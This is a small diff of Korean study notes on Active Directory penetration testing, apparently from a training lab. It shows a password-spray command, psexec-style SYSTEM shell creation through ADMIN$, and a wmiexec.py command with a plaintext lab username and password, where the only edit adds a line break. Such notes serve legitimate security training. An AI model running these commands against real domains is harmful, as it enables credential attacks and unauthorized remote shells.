@@ -179,7 +179,7 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
 : 임의의 실행파일을 대상 호스트의 `ADMIN$` 공유에 업로드하여 원격 서비스를 생성, SYSTEM 쉘 획득
 
 ### wmiexec.py를 사용
-```wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5```
+```wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5```<br/>
 : SYSTEM이 아닌 사용자 계정으로 쉘 실행, 은밀하지만 cmd.exe 생성 로그가 남음
 
 ### Windapsearch - Domain Admins
